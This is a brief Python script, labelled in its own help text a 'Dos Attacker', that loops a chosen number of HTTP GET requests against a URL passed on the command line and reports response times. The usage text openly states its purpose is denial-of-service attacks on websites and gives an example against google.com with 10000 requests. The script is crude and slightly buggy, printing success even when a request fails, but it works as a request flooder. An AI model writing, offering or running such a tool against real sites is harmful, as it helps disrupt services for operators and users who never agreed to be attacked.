import requests
import time
import sys

URL = str(sys.argv[1])

if URL != 'help':
    times = int(sys.argv[2])
    for x in range(times):
        c_time = time.time()
        try:
            s = requests.get(URL)
        except:
            print ('[!!] Cannot get the Website ')


        print ('[+] Got the website : ', str(x + 1 ), ' : ', str(time.time() - c_time ))
        c_time  = time.time()
else:
    print ('''
    
    *****************************
    Dos Attacker by Khalid Obaide
    *****************************
    
    usage : use this to do Dos attack on websites
    
    $1 : The website Url
    $2 : The Times you want to send request
    
    example : python3 dos.py https:google.com 10000
    
    ''')
